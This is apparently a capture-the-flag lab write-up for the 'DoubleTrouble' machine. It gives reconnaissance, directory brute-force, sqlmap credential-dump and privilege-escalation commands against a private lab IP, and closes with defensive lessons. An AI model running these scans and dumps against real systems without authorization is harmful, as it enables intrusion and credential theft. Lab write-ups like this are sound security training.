# DoubleTrouble – Attack Notes

## Target Information
- Target IP: 192.168.100.9
- Attacker Machine: Kali Linux
- Network Type: NAT / Host-Only

---

## Phase 1 – Reconnaissance

### Nmap Scan
Command:
```
nmap -sC -sV -A 192.168.100.9
```

Discovered:
- 22/tcp – SSH
- 80/tcp – HTTP
- 3306/tcp – MySQL

---

## Phase 2 – Web Enumeration

### Directory Brute Forcing
Command:
```
gobuster dir -u http://192.168.100.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Discovered:
- /index.php
- Login form present
- Potential injection point

---

## Phase 3 – SQL Injection

### SQLMap Exploitation
Command:
```
sqlmap -u http://192.168.100.9/index.php --forms --current-db -D doubletrouble -T users --dump
```

Result:
- Database name: doubletrouble
- Table dumped: users
- Retrieved credentials

---

## Phase 4 – Initial Access

Used extracted credentials to gain shell access.

Possible methods:
- SSH login
- Web shell
- Reverse shell

---

## Phase 5 – Privilege Escalation

### SUID Check
```
find / -perm -4000 -type f 2>/dev/null
```

### LinPEAS
```
./linpeas.sh
```

Root access successfully obtained.

---

## Flags

User Flag:
```
cat /home/user/user.txt
```

Root Flag:
```
cat /root/root.txt
```
---

## Vulnerability Identified

| Vulnerability | Type | Impact |
|---------------|------|--------|
| SQL Injection | Injection | Database compromise |
| Credential Exposure | Sensitive Data | Unauthorized access |
| Privilege Escalation Misconfiguration | Local Privilege Escalation | Root access |

---

## Lessons Learned

- Always validate and sanitize user input
- Use prepared statements to prevent SQL injection
- Restrict database exposure
- Apply principle of least privilege
- Regularly patch and update services
